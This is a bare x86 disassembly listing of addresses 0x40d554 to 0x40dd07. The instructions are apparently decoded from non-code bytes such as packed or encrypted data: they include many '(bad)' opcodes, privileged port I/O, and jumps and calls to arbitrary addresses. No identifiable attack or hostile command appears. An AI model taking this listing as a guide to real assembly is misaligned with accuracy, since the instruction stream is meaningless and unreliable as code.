  40d554:	mov    esp,0x934c866
  40d559:	dec    ebp
  40d55a:	mov    ebp,0xe39433c7
  40d55f:	fisttp WORD PTR [edx+0x6e1a5a08]
  40d565:	pop    edi
  40d566:	stos   DWORD PTR es:[edi],eax
  40d567:	mov    ebp,0xb0b5d3b8
  40d56c:	shl    DWORD PTR [ecx-0x7a],cl
  40d56f:	or     al,0xe4
  40d571:	or     ebx,DWORD PTR [esi+esi*2]
  40d574:	scas   eax,DWORD PTR es:[edi]
  40d575:	mov    dl,0x71
  40d577:	sti    
  40d578:	loop   0x40d574
  40d57a:	imul   esp,DWORD PTR [eax-0x38],0xffffffa5
  40d57e:	xchg   edx,eax
  40d57f:	mov    ah,0x77
  40d581:	enter  0x2f24,0xb7
  40d585:	and    esp,ebx
  40d587:	sahf   
  40d588:	jns    0x40d5c3
  40d58a:	fwait
  40d58b:	or     dl,BYTE PTR ds:0xab2b891f
  40d591:	das    
  40d592:	mov    edx,cs
  40d594:	pop    ecx
  40d595:	test   cl,bl
  40d597:	and    edi,DWORD PTR [edx-0x6a40f8e3]
  40d59d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d59e:	pop    ebp
  40d59f:	xor    DWORD PTR [ebp-0x351d9a46],eax
  40d5a5:	jae    0x40d5ca
  40d5a7:	xchg   esi,eax
  40d5a8:	jle    0x40d587
  40d5aa:	sub    dh,BYTE PTR [edx+edx*8]
  40d5ad:	mov    esi,eax
  40d5af:	dec    edi
  40d5b0:	xor    al,0x4e
  40d5b2:	sub    eax,esi
  40d5b4:	inc    esi
  40d5b5:	cld    
  40d5b6:	mov    esi,0xb13ab37f
  40d5bb:	les    edi,FWORD PTR ds:[esi+ebp*1-0x5b0f3836]
  40d5c3:	cld    
  40d5c4:	cwde   
  40d5c5:	add    eax,0x35039b78
  40d5ca:	push   ebp
  40d5cb:	and    DWORD PTR [ebp+0x73],esi
  40d5ce:	jmp    0x40d56d
  40d5d0:	call   0x72e20f7d
  40d5d5:	repz sub BYTE PTR [ebx-0x15f93bee],0xa2
  40d5dd:	add    BYTE PTR [edx+edx*1+0x7ac68bf5],ah
  40d5e4:	xchg   esp,eax
  40d5e5:	fdiv   QWORD PTR cs:[eax-0x70]
  40d5e9:	pop    eax
  40d5ea:	mov    esp,0xe0c22e1b
  40d5ef:	arpl   WORD PTR [edx+0x15f719ed],di
  40d5f5:	rol    ecx,0xcd
  40d5f8:	jge    0x40d5c7
  40d5fa:	mov    eax,0x8f116217
  40d5ff:	(bad)  
  40d600:	jecxz  0x40d60a
  40d602:	xor    DWORD PTR [ebp+0x7d19574d],esp
  40d608:	mov    bl,dh
  40d60a:	mov    edi,0x1034e1a7
  40d60f:	repnz xor eax,0xb66d469d
  40d615:	sbb    edx,DWORD PTR ds:0xf17f10a0
  40d61b:	aas    
  40d61c:	retf   
  40d61d:	fsub   st(6),st
  40d61f:	adc    DWORD PTR [ebx+0x15],ecx
  40d622:	enter  0x1ba2,0x24
  40d626:	(bad)  
  40d628:	dec    esi
  40d629:	iret   
  40d62a:	mov    ecx,0x9d57236f
  40d62f:	test   DWORD PTR [esi-0x210e006],ecx
  40d635:	ja     0x40d60b
  40d637:	ins    BYTE PTR es:[edi],dx
  40d638:	in     eax,0xe
  40d63a:	sbb    eax,0xf9dd1977
  40d63f:	push   ebx
  40d640:	int3   
  40d641:	mov    dh,0x8f
  40d643:	jmp    0x40d68d
  40d645:	xchg   ebx,eax
  40d646:	cli    
  40d647:	pop    esi
  40d648:	xchg   esi,eax
  40d649:	jnp    0x40d629
  40d64b:	cmc    
  40d64c:	sub    esi,DWORD PTR [ebx+0x39]
  40d64f:	sti    
  40d650:	inc    ch
  40d652:	or     eax,0x8ef50491
  40d657:	daa    
  40d658:	lea    esi,[edx+eax*2]
  40d65b:	(bad)  
  40d65c:	bnd jo 0x40d67f
  40d65f:	adc    BYTE PTR [edx],dl
  40d661:	xchg   edi,eax
  40d662:	mov    esp,0xd50c8170
  40d667:	lods   eax,DWORD PTR ds:[esi]
  40d668:	xor    bh,BYTE PTR [edi]
  40d66a:	stos   DWORD PTR es:[edi],eax
  40d66b:	push   ecx
  40d66c:	jl     0x40d66a
  40d66e:	pusha  
  40d66f:	test   eax,0xb103c713
  40d674:	dec    esp
  40d675:	xchg   esp,eax
  40d676:	mov    cl,0x2a
  40d678:	xor    al,0xd3
  40d67a:	inc    edx
  40d67b:	inc    eax
  40d67c:	xchg   ecx,eax
  40d67d:	ins    BYTE PTR es:[edi],dx
  40d67e:	cmp    al,0x93
  40d680:	loopne 0x40d6c2
  40d682:	test   eax,0xe334575c
  40d687:	jl     0x40d702
  40d689:	adc    BYTE PTR [edx+0x4a],0x16
  40d68d:	in     eax,dx
  40d68e:	sub    eax,0xc1975102
  40d693:	sub    al,0xae
  40d695:	mov    dh,0xe3
  40d697:	pop    esp
  40d698:	cmp    BYTE PTR ds:0x7f2f0d1b,dh
  40d69e:	out    0x61,al
  40d6a0:	pusha  
  40d6a1:	sbb    al,0x0
  40d6a3:	scas   al,BYTE PTR es:[edi]
  40d6a4:	outs   dx,DWORD PTR es:[esi]
  40d6a6:	cmp    al,BYTE PTR [ebp+0x94b22f5]
  40d6ac:	in     eax,dx
  40d6ad:	push   ecx
  40d6ae:	mov    ecx,0xba24d917
  40d6b3:	les    eax,FWORD PTR [ebx+0x3ab29453]
  40d6b9:	arpl   WORD PTR [eax-0x4f822ca5],ax
  40d6bf:	hlt    
  40d6c0:	addr16 jmp 0x40d677
  40d6c3:	mov    DWORD PTR [ebp-0x3fc58744],edi
  40d6c9:	leave  
  40d6ca:	xchg   edx,eax
  40d6cb:	xor    bh,BYTE PTR fs:[ebp-0x48]
  40d6cf:	mov    edi,0xda35d944
  40d6d4:	cdq    
  40d6d5:	rcr    ebp,0x12
  40d6d8:	lahf   
  40d6d9:	es xor esi,ebp
  40d6dc:	test   bl,dl
  40d6de:	test   DWORD PTR [ebx],ebp
  40d6e0:	dec    ebp
  40d6e1:	(bad)  
  40d6e2:	pop    es
  40d6e3:	int    0x0
  40d6e5:	sub    eax,0x1a96010a
  40d6ea:	dec    edx
  40d6eb:	ret    
  40d6ec:	sbb    eax,0x3d473b02
  40d6f1:	cli    
  40d6f2:	inc    ebp
  40d6f3:	call   0x1c652ba2
  40d6f8:	sar    BYTE PTR [eax],cl
  40d6fa:	and    DWORD PTR [esi-0x4f906ab8],edi
  40d700:	mov    ds:0x7916625,eax
  40d705:	ja     0x40d6e1
  40d707:	into   
  40d708:	and    bh,al
  40d70a:	cmp    DWORD PTR ds:0x98c4b263,edi
  40d710:	outs   dx,DWORD PTR ds:[esi]
  40d711:	retf   0xf6e5
  40d714:	dec    eax
  40d715:	mov    eax,0x14e62cb6
  40d71a:	xor    BYTE PTR [eax-0x69f1de22],0x95
  40d721:	adc    DWORD PTR [eax+0x6a14299e],ebx
  40d727:	fld    TBYTE PTR [esi]
  40d729:	test   DWORD PTR [eax-0x1edf08ca],esi
  40d72f:	rol    DWORD PTR [ebx+0x73ab06af],1
  40d735:	jo     0x40d759
  40d737:	in     eax,dx
  40d738:	and    eax,0x39264c8a
  40d73d:	lods   al,BYTE PTR ds:[esi]
  40d73e:	cmp    DWORD PTR [ebx-0x2e],eax
  40d741:	inc    ecx
  40d742:	and    al,0xe
  40d744:	inc    edx
  40d745:	call   0xafa118bd
  40d74a:	adc    BYTE PTR [ecx],bl
  40d74c:	sbb    al,0x9d
  40d74e:	push   esp
  40d74f:	aam    0xd4
  40d751:	add    eax,0x6c859901
  40d756:	mov    ebx,0xd428436b
  40d75b:	into   
  40d75c:	xchg   DWORD PTR [ecx],esp
  40d75e:	xchg   edi,eax
  40d75f:	frstor [ecx]
  40d761:	mov    ecx,DWORD PTR ds:0xb6e72f88
  40d767:	out    0x4d,al
  40d769:	pop    ebx
  40d76a:	ret    0x5d5e
  40d76d:	jbe    0x40d706
  40d76f:	mov    dh,0xfc
  40d771:	or     al,0x66
  40d773:	jo     0x40d7cb
  40d775:	or     dl,BYTE PTR [edi-0x48b4752d]
  40d77b:	ror    bh,0xfa
  40d77e:	int3   
  40d77f:	inc    edi
  40d780:	imul   edi,DWORD PTR [edx+0x4f],0xffffffd0
  40d784:	repz jle 0x40d7ea
  40d787:	lahf   
  40d788:	mov    esp,edx
  40d78a:	inc    eax
  40d78b:	jecxz  0x40d74f
  40d78d:	rol    DWORD PTR [eax],1
  40d78f:	jns    0x40d755
  40d791:	stc    
  40d792:	(bad)  
  40d793:	aad    0x5f
  40d795:	(bad)  
  40d797:	jecxz  0x40d7d3
  40d799:	push   edx
  40d79a:	add    BYTE PTR [eax],bh
  40d79c:	or     BYTE PTR [edi+0x2fc36500],bh
  40d7a2:	inc    esp
  40d7a3:	pop    es
  40d7a4:	pop    es
  40d7a5:	push   cs
  40d7a6:	iret   
  40d7a7:	fist   DWORD PTR [eax+0x36e030fb]
  40d7ad:	adc    eax,0x97e54e04
  40d7b2:	push   edx
  40d7b3:	stos   BYTE PTR es:[edi],al
  40d7b4:	test   al,0xd4
  40d7b6:	(bad)  
  40d7b7:	push   cs
  40d7b8:	push   ebp
  40d7b9:	mov    dh,0x3e
  40d7bb:	pop    ebx
  40d7bc:	sub    BYTE PTR [ebx],0xeb
  40d7bf:	fst    QWORD PTR ds:0xaf0d1d46
  40d7c5:	pop    ss
  40d7c6:	ds in  al,0x85
  40d7c9:	mov    al,ds:0x6f1f70ee
  40d7ce:	gs ret 0xab34
  40d7d2:	push   ebx
  40d7d3:	add    dh,BYTE PTR [esi]
  40d7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7d6:	fwait
  40d7d7:	xchg   ebp,eax
  40d7d8:	into   
  40d7d9:	sbb    BYTE PTR [ebp-0x380b407d],dh
  40d7df:	and    eax,0xd734be8c
  40d7e4:	or     eax,0xf8afd2cb
  40d7e9:	dec    esi
  40d7ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7eb:	into   
  40d7ec:	int3   
  40d7ed:	xor    DWORD PTR [ecx-0x5bc00e12],edi
  40d7f3:	push   ebp
  40d7f4:	or     eax,0x9ec059f8
  40d7f9:	imul   edx,DWORD PTR [ecx+0x763fcace],0xdc10c1c2
  40d803:	clc    
  40d804:	enter  0xd52b,0xbb
  40d808:	mov    ch,0xd
  40d80a:	call   0xdf80b823
  40d80f:	push   ebp
  40d810:	inc    eax
  40d811:	pop    esp
  40d812:	cld    
  40d813:	or     DWORD PTR [edi],esi
  40d815:	adc    eax,0x9e45302e
  40d81a:	int    0x2c
  40d81c:	shr    ebp,0xc9
  40d81f:	cmp    ah,BYTE PTR [ebx+ebp*2]
  40d822:	lods   al,BYTE PTR ds:[esi]
  40d823:	pop    es
  40d824:	stc    
  40d825:	daa    
  40d826:	push   ecx
  40d827:	dec    ecx
  40d828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d829:	dec    esi
  40d82a:	data16 stc 
  40d82c:	mov    ebx,ss
  40d82e:	mov    bh,0x4b
  40d830:	pop    ecx
  40d831:	push   es
  40d832:	jp     0x40d86e
  40d834:	or     ah,al
  40d836:	cmp    al,0xe0
  40d838:	push   eax
  40d839:	clc    
  40d83a:	loopne 0x40d850
  40d83c:	aaa    
  40d83d:	or     al,0x30
  40d83f:	ret    
  40d840:	sbb    BYTE PTR [ebx],dh
  40d842:	sbb    esp,DWORD PTR [edx]
  40d844:	out    dx,al
  40d845:	addr16 jno 0x40d861
  40d848:	sub    al,0x95
  40d84a:	and    al,BYTE PTR [esp+ebp*1+0x2110ca7a]
  40d851:	rcpps  xmm0,XMMWORD PTR [ebx-0x72fa8922]
  40d858:	mov    WORD PTR [esi+0x771dd56c],?
  40d85e:	dec    edx
  40d85f:	sbb    al,0xda
  40d861:	into   
  40d862:	push   edi
  40d863:	xchg   edi,eax
  40d864:	jecxz  0x40d81b
  40d866:	rcl    ah,1
  40d868:	jp     0x40d856
  40d86a:	frstor [ebx-0x75]
  40d86d:	sub    al,0x2a
  40d86f:	or     edi,edx
  40d871:	mov    bl,BYTE PTR [eax-0x26]
  40d874:	mov    BYTE PTR [ebx],ah
  40d876:	mov    dl,0xd9
  40d878:	mov    edi,0x8c89c09b
  40d87d:	xor    DWORD PTR [ebp+0x220be944],esp
  40d883:	adc    ebp,edi
  40d885:	fsub   DWORD PTR [edi+0x5a]
  40d888:	jp     0x40d84e
  40d88a:	add    dh,BYTE PTR [esi]
  40d88c:	cs neg esi
  40d88f:	mov    ebx,DWORD PTR [eax]
  40d891:	and    BYTE PTR ds:0x4e27dd28,bl
  40d897:	test   DWORD PTR [ecx],ebx
  40d899:	in     eax,0x1b
  40d89b:	xor    eax,0x9771a0ed
  40d8a0:	clc    
  40d8a1:	scas   eax,DWORD PTR es:[edi]
  40d8a2:	les    ebx,FWORD PTR [ebx]
  40d8a4:	mov    ah,0x76
  40d8a6:	pop    edi
  40d8a7:	mov    cl,0x1
  40d8a9:	push   es
  40d8aa:	dec    eax
  40d8ab:	ds test eax,0xd167d501
  40d8b1:	cmp    edx,DWORD PTR [eax-0x1825091d]
  40d8b7:	daa    
  40d8b8:	call   0x9155:0xb5403800
  40d8bf:	push   esp
  40d8c0:	adc    BYTE PTR [edi],ah
  40d8c2:	jecxz  0x40d8ac
  40d8c4:	mov    ch,0x6b
  40d8c6:	cmp    al,BYTE PTR [ebx+0x16ce2a5c]
  40d8cc:	call   0xe0e64346
  40d8d1:	sahf   
  40d8d2:	jns    0x40d94c
  40d8d4:	fmul   st,st(2)
  40d8d6:	dec    ebx
  40d8d7:	xchg   BYTE PTR [eax],ah
  40d8d9:	add    al,BYTE PTR [edi-0x477fa713]
  40d8df:	jge    0x40d926
  40d8e1:	out    dx,eax
  40d8e2:	jo     0x40d87f
  40d8e4:	sbb    BYTE PTR [edx],ah
  40d8e6:	syscall 
  40d8e8:	inc    edi
  40d8e9:	mov    bl,0xa4
  40d8eb:	fst    st(2)
  40d8ed:	jno    0x40d8e5
  40d8ef:	fcomp  QWORD PTR [ebp+0x4a]
  40d8f2:	cmp    al,0x9b
  40d8f4:	or     eax,0xf656479f
  40d8f9:	retf   
  40d8fa:	mov    eax,0x2149c6a8
  40d8ff:	test   eax,0xea49179
  40d904:	imul   edx,ecx,0x69
  40d907:	push   esp
  40d908:	or     eax,0x31ed83a3
  40d90d:	sub    DWORD PTR [ebx-0x5b],edx
  40d910:	neg    DWORD PTR [eax+0x3b3d6b58]
  40d916:	mov    al,ds:0xcae1d6df
  40d91b:	or     esp,DWORD PTR [esp+eiz*4+0x6d]
  40d91f:	sub    BYTE PTR [esp+edx*4-0x750b129c],ch
  40d926:	sar    DWORD PTR [edx+0x6],1
  40d929:	dec    edi
  40d92a:	push   ebp
  40d92b:	mov    ds:0xe6453aeb,al
  40d930:	add    eax,0x240340d2
  40d935:	ja     0x40d91b
  40d937:	jo     0x40d8cf
  40d939:	call   0x35c6:0xc10e3ac6
  40d940:	addr16 add eax,0xeb6794f5
  40d946:	cli    
  40d947:	pop    ecx
  40d948:	xchg   ebp,eax
  40d949:	sbb    ecx,DWORD PTR [edx-0x5e311930]
  40d94f:	or     BYTE PTR [esi+0x6f],ah
  40d952:	mov    eax,0x18101cdf
  40d957:	cmp    eax,0x7ec345ae
  40d95c:	in     eax,0x11
  40d95e:	mov    ebp,ss
  40d960:	sahf   
  40d961:	sub    edi,0x5a
  40d964:	mov    ch,0x27
  40d966:	mov    DWORD PTR [esi+0x44],0x2e02373f
  40d96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d96e:	or     BYTE PTR [edi],bl
  40d970:	mov    dl,0xd2
  40d972:	(bad)  
  40d974:	xchg   esp,eax
  40d975:	cld    
  40d976:	xchg   esi,eax
  40d977:	mov    bl,0x4d
  40d979:	fcom   DWORD PTR [ebx+0x29e56197]
  40d97f:	pushf  
  40d980:	test   BYTE PTR [ebx-0x76],bl
  40d983:	addr16 jmp 0xca7865b8
  40d989:	xchg   esi,eax
  40d98a:	inc    ecx
  40d98b:	and    cl,0x8a
  40d98e:	jle    0x40d97d
  40d990:	(bad)  
  40d991:	jmp    0x27c3fac4
  40d996:	and    edx,DWORD PTR [edi]
  40d998:	mov    bl,0xd0
  40d99a:	icebp  
  40d99b:	mov    es,WORD PTR [ecx-0x36]
  40d99e:	sbb    edi,DWORD PTR [edi-0x3a306667]
  40d9a4:	inc    eax
  40d9a5:	mov    ?,ebp
  40d9a7:	push   ebp
  40d9a8:	call   0x80ad:0xdfb5111e
  40d9af:	push   0x57
  40d9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9b2:	sub    ch,BYTE PTR [edi+0x5f]
  40d9b5:	or     cl,BYTE PTR [ecx-0x66]
  40d9b8:	or     al,0xea
  40d9ba:	jmp    0x2de9696d
  40d9bf:	pop    es
  40d9c0:	mov    ds:0xe045e232,eax
  40d9c5:	xchg   BYTE PTR [esi],dh
  40d9c7:	aaa    
  40d9c8:	push   ebp
  40d9c9:	call   0x3a242ba2
  40d9ce:	and    esp,ecx
  40d9d0:	dec    eax
  40d9d1:	mov    esi,0x7cff992c
  40d9d6:	lahf   
  40d9d7:	jmp    0x40da4f
  40d9d9:	test   al,0x89
  40d9db:	into   
  40d9dc:	or     al,0x61
  40d9de:	ds pop ss
  40d9e0:	out    dx,al
  40d9e1:	mov    bh,0xa1
  40d9e3:	and    ah,BYTE PTR [edi]
  40d9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9e6:	cwde   
  40d9e7:	or     edi,0x57
  40d9ea:	pop    esp
  40d9eb:	aad    0x98
  40d9ed:	mov    ebx,0xbb80c665
  40d9f2:	mov    esi,0x27a4b39d
  40d9f7:	imul   esp,DWORD PTR [ebp+0x7272f302],0x2a05a339
  40da01:	out    dx,eax
  40da02:	pop    esp
  40da03:	add    eax,0x9192c7da
  40da08:	repnz or BYTE PTR [eax-0x2563100e],dh
  40da0f:	xor    cl,dl
  40da11:	or     al,0x53
  40da13:	scas   al,BYTE PTR es:[edi]
  40da14:	adc    eax,0x3ba604ea
  40da19:	or     eax,0x5ac80d13
  40da1e:	xor    DWORD PTR [eax-0x1ea54ef],ebp
  40da24:	ja     0x40da23
  40da26:	outs   dx,BYTE PTR ds:[esi]
  40da27:	retf   0xea64
  40da2a:	xchg   edx,eax
  40da2b:	push   edx
  40da2c:	mov    edx,0x61c8d3c3
  40da31:	outs   dx,BYTE PTR ds:[esi]
  40da32:	pushf  
  40da33:	cdq    
  40da34:	mov    bh,0xfd
  40da36:	dec    ebx
  40da37:	mov    eax,0xc3b8031b
  40da3c:	xchg   BYTE PTR [esi+0x2200347c],al
  40da42:	sbb    eax,0xd94aa36b
  40da47:	sub    eax,DWORD PTR [ebp-0x1789dad0]
  40da4d:	mov    ebp,0xfe7d0ecf
  40da52:	rcr    BYTE PTR [ecx],0x35
  40da55:	fsubr  QWORD PTR [edi]
  40da57:	(bad)  
  40da58:	repnz add al,BYTE PTR gs:[eax]
  40da5c:	mov    ah,0xd5
  40da5e:	push   ebp
  40da5f:	dec    esp
  40da60:	push   0xfffffff7
  40da62:	add    al,0x68
  40da64:	loopne 0x40da6b
  40da66:	int3   
  40da67:	push   0xffffffcf
  40da69:	cmp    esp,DWORD PTR [edi-0x38e81846]
  40da6f:	ror    DWORD PTR [eax],cl
  40da71:	enter  0x3648,0x4
  40da75:	push   cs
  40da76:	jae    0x40da18
  40da78:	xchg   eax,edx
  40da7a:	mov    esp,0x237f4cb2
  40da7f:	(bad)  
  40da80:	retf   
  40da81:	xchg   edi,eax
  40da82:	add    ebp,ebx
  40da84:	pop    esp
  40da85:	push   edi
  40da86:	pop    edi
  40da87:	imul   ebp,DWORD PTR [esi-0x11],0x4100b703
  40da8e:	int3   
  40da8f:	push   cs
  40da90:	sub    al,0xd0
  40da92:	cdq    
  40da93:	ja     0x40da6b
  40da95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da96:	popf   
  40da97:	jno    0x40da1a
  40da99:	adc    edi,eax
  40da9b:	in     al,dx
  40da9c:	add    BYTE PTR [eax],0xf5
  40da9f:	cmc    
  40daa0:	jo     0x40da45
  40daa2:	mov    edx,DWORD PTR [edx+esi*4]
  40daa5:	je     0x40dad1
  40daa7:	or     edx,DWORD PTR [ebp+0x4d63efb4]
  40daad:	gs inc esi
  40daaf:	scas   eax,DWORD PTR es:[edi]
  40dab0:	outs   dx,BYTE PTR ds:[esi]
  40dab1:	xor    ebp,edi
  40dab3:	jp     0x40dae7
  40dab5:	sub    esp,DWORD PTR [esi]
  40dab7:	mov    ch,0xdd
  40dab9:	pop    ds
  40daba:	je     0x40daf7
  40dabc:	mov    ah,0x70
  40dabe:	test   eax,0x682ffa09
  40dac3:	sbb    eax,0xebf526f
  40dac8:	loopne 0x40da7a
  40daca:	aad    0x84
  40dacc:	pop    es
  40dacd:	xlat   BYTE PTR ds:[ebx]
  40dace:	leave  
  40dacf:	loop   0x40da81
  40dad1:	inc    esp
  40dad2:	rol    DWORD PTR [ebx-0x25556e9b],cl
  40dad8:	sbb    cl,BYTE PTR [edx-0x52]
  40dadb:	pop    edi
  40dadc:	jo     0x40daee
  40dade:	push   edx
  40dadf:	idiv   DWORD PTR [esi-0x71932ab9]
  40dae5:	inc    esi
  40dae6:	outs   dx,DWORD PTR ds:[esi]
  40dae7:	sub    BYTE PTR [esi+0x15],bl
  40daea:	ss cmc 
  40daec:	adc    eax,0x5ab52f78
  40daf1:	icebp  
  40daf2:	push   cs
  40daf3:	scas   al,BYTE PTR es:[edi]
  40daf4:	fs sbb dl,al
  40daf7:	cmp    al,0x65
  40daf9:	cmp    eax,0xa86a811a
  40dafe:	lds    ecx,FWORD PTR [ecx]
  40db00:	icebp  
  40db01:	add    DWORD PTR [eax+0x4],eax
  40db04:	ja     0x40db7f
  40db06:	cmp    BYTE PTR [ebp-0xc],ah
  40db09:	imul   edi,DWORD PTR [eax],0x3a30ca4d
  40db0f:	in     eax,dx
  40db10:	inc    esi
  40db11:	dec    esp
  40db12:	and    dh,BYTE PTR [ebx]
  40db14:	sbb    ch,BYTE PTR [ecx+0x6adcb045]
  40db1a:	mov    dl,dh
  40db1c:	outs   dx,DWORD PTR ds:[esi]
  40db1d:	xchg   edx,eax
  40db1e:	mov    cl,0x92
  40db20:	and    edi,DWORD PTR ss:[edx+0x39]
  40db24:	retf   0xeaf9
  40db27:	mov    ebp,0x570af821
  40db2c:	push   cs
  40db2d:	mov    BYTE PTR gs:[eax],dl
  40db30:	ret    0x3202
  40db33:	arpl   WORD PTR cs:[ecx+0x7a],cx
  40db37:	inc    ebx
  40db38:	repnz add DWORD PTR [ebp+0x48],edi
  40db3c:	pop    ecx
  40db3d:	push   ebp
  40db3e:	adc    BYTE PTR [edx+esi*4],bl
  40db41:	(bad)  
  40db43:	pushf  
  40db44:	push   ebx
  40db45:	data16 jnp 0x40db1a
  40db48:	dec    ebp
  40db49:	push   0x712f0dd0
  40db4e:	sahf   
  40db4f:	sub    DWORD PTR [ecx+0x31],esp
  40db52:	repnz add eax,0x9efae9ef
  40db58:	adc    edx,0xc475f4c5
  40db5e:	mov    ebx,DWORD PTR [esi+eax*1]
  40db61:	mov    ebx,0xcb28a9d1
  40db66:	or     eax,0x8350854b
  40db6b:	mov    ch,0x48
  40db6d:	mov    eax,ds:0x176446ce
  40db72:	fdiv   st,st(5)
  40db74:	cmp    al,0x7d
  40db76:	shl    BYTE PTR [edi],0x69
  40db79:	xlat   BYTE PTR ds:[ebx]
  40db7a:	pop    ebp
  40db7b:	or     ah,BYTE PTR [esi]
  40db7d:	add    ah,0xda
  40db80:	test   DWORD PTR [ecx],edx
  40db82:	sbb    ecx,DWORD PTR [ebx]
  40db84:	imul   eax,DWORD PTR [edx-0x49aef8ae],0x2
  40db8b:	std    
  40db8c:	fnstsw WORD PTR [edx+0x18978b36]
  40db92:	mov    ch,BYTE PTR [esi-0x64]
  40db95:	popa   
  40db96:	scas   eax,DWORD PTR es:[edi]
  40db97:	or     BYTE PTR [ebp-0x17038c5e],0x70
  40db9e:	cmp    ch,BYTE PTR [eax]
  40dba0:	sbb    dh,BYTE PTR [esp+eax*2]
  40dba3:	ror    ch,0x87
  40dba6:	or     esi,edi
  40dba8:	sbb    ecx,DWORD PTR [edi]
  40dbaa:	sbb    esp,ebx
  40dbac:	pop    ebp
  40dbad:	fwait
  40dbae:	inc    ebx
  40dbaf:	imul   edi,DWORD PTR [edi+0x7df587bf],0xffffff98
  40dbb6:	mov    al,0x8a
  40dbb8:	out    dx,al
  40dbb9:	push   0x3958817e
  40dbbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbbf:	cld    
  40dbc0:	jb     0x40dc05
  40dbc2:	test   al,0x2a
  40dbc4:	inc    esi
  40dbc5:	pushf  
  40dbc6:	mov    dh,0xb
  40dbc8:	mov    ah,0x4a
  40dbca:	hlt    
  40dbcb:	adc    cl,BYTE PTR [ecx+0x6cfd8d31]
  40dbd1:	jnp    0x40db6f
  40dbd3:	scas   al,BYTE PTR es:[edi]
  40dbd4:	sub    DWORD PTR [esp+esi*1-0x6d17e5a7],esi
  40dbdb:	test   DWORD PTR [edi-0x6b69bd48],0x4a732b78
  40dbe5:	mov    ah,0x52
  40dbe7:	fbstp  TBYTE PTR [eax+0x52]
  40dbea:	inc    ecx
  40dbeb:	adc    eax,0xb395b97d
  40dbf0:	mov    WORD PTR [edx-0x75],ss
  40dbf3:	adc    ax,0xc071
  40dbf7:	jg     0x40dbbc
  40dbf9:	push   ecx
  40dbfa:	push   bx
  40dbfc:	into   
  40dbfd:	fiadd  WORD PTR ds:0x2276dcda
  40dc03:	adc    al,0xc4
  40dc05:	in     al,0xad
  40dc07:	(bad)  
  40dc08:	ficomp WORD PTR [ecx]
  40dc0a:	add    eax,0x701707a6
  40dc0f:	xchg   edx,eax
  40dc10:	outs   dx,BYTE PTR ds:[esi]
  40dc11:	cwde   
  40dc12:	mov    bh,0x1d
  40dc14:	aas    
  40dc15:	retf   0xda2a
  40dc18:	push   es
  40dc19:	xchg   esi,eax
  40dc1a:	adc    ebx,DWORD PTR [ecx+edi*2]
  40dc1d:	cli    
  40dc1e:	loope  0x40dc87
  40dc20:	imul   ebx,DWORD PTR [esi+0x72387498],0x72
  40dc27:	imul   eax,DWORD PTR [eax],0x415de8ec
  40dc2d:	xchg   esp,eax
  40dc2e:	popa   
  40dc2f:	mov    edx,0x8140adfa
  40dc34:	fmul   DWORD PTR [esi-0x75]
  40dc37:	add    DWORD PTR cs:[ecx-0x351177dd],0x4bc8588c
  40dc42:	daa    
  40dc43:	adc    DWORD PTR [esi],ebx
  40dc45:	iret   
  40dc46:	mov    ds:0x490279e4,al
  40dc4b:	pop    es
  40dc4c:	cmp    eax,DWORD PTR [esi]
  40dc4e:	or     eax,DWORD PTR [ecx+0x3fa9ba9f]
  40dc54:	cli    
  40dc55:	and    al,0xff
  40dc57:	push   eax
  40dc58:	cmp    DWORD PTR [esi],ecx
  40dc5a:	mov    bl,ch
  40dc5c:	pushf  
  40dc5d:	dec    esp
  40dc5e:	mov    esp,0xb3987c43
  40dc63:	pop    ebx
  40dc64:	loope  0x40dca0
  40dc66:	mov    dh,0xc
  40dc68:	shl    DWORD PTR [esi-0x2b24a814],0x50
  40dc6f:	jno    0x40dcd5
  40dc71:	(bad)  
  40dc72:	dec    edi
  40dc73:	(bad)  
  40dc74:	loope  0x40dc25
  40dc76:	jnp    0x40dc89
  40dc78:	xor    ebp,DWORD PTR [edx-0x9]
  40dc7b:	add    BYTE PTR [ebp-0x6b],dl
  40dc7e:	sbb    DWORD PTR [eax-0x42],ebp
  40dc81:	stc    
  40dc82:	enter  0x6273,0xa6
  40dc86:	inc    esi
  40dc87:	xchg   ebp,eax
  40dc88:	cwde   
  40dc89:	mov    esp,0xce2f29b7
  40dc8e:	sub    bl,BYTE PTR [eax-0x2c21518e]
  40dc94:	es loop 0x40dc68
  40dc97:	dec    ebx
  40dc98:	push   ebp
  40dc99:	arpl   ax,bx
  40dc9b:	dec    ebx
  40dc9c:	mov    edx,0x147fe918
  40dca1:	cmp    al,0xf7
  40dca3:	or     al,0x1
  40dca5:	add    al,0x32
  40dca7:	cmp    esp,DWORD PTR [eax]
  40dca9:	inc    esp
  40dcaa:	aaa    
  40dcab:	fcomp  QWORD PTR ds:0xa3998f26
  40dcb1:	retf   
  40dcb2:	xchg   DWORD PTR [edx-0x8da1af2],eax
  40dcb8:	push   ss
  40dcb9:	arpl   WORD PTR [eax],bx
  40dcbb:	(bad)  
  40dcbc:	sbb    al,0xbd
  40dcbe:	xor    al,0xe1
  40dcc0:	push   eax
  40dcc1:	and    bl,BYTE PTR [edi+0xe]
  40dcc4:	test   eax,0x31b3d23d
  40dcc9:	fimul  DWORD PTR [edx+edx*4-0xb294836]
  40dcd0:	pop    edi
  40dcd1:	sub    ch,BYTE PTR [eax+0xfa03964]
  40dcd7:	push   ebx
  40dcd8:	jmp    0x246b81a0
  40dcdd:	add    edx,ebx
  40dcdf:	push   ebx
  40dce0:	and    bl,al
  40dce2:	xchg   esp,eax
  40dce3:	push   esi
  40dce4:	mov    WORD PTR [edx-0x12],fs
  40dce7:	fild   WORD PTR [ebx+ecx*1-0x2ff4d39c]
  40dcee:	sub    DWORD PTR [edi],esi
  40dcf0:	js     0x40dd0f
  40dcf2:	sbb    al,0x48
  40dcf4:	aaa    
  40dcf5:	or     ah,bl
  40dcf7:	iret   
  40dcf8:	mov    ecx,0xeddd04b2
  40dcfd:	(bad)  
  40dcfe:	daa    
  40dcff:	inc    esp
  40dd00:	inc    esp
  40dd01:	mov    ds:0xdd0df75e,eax
  40dd06:	sahf   
  40dd07:	std    
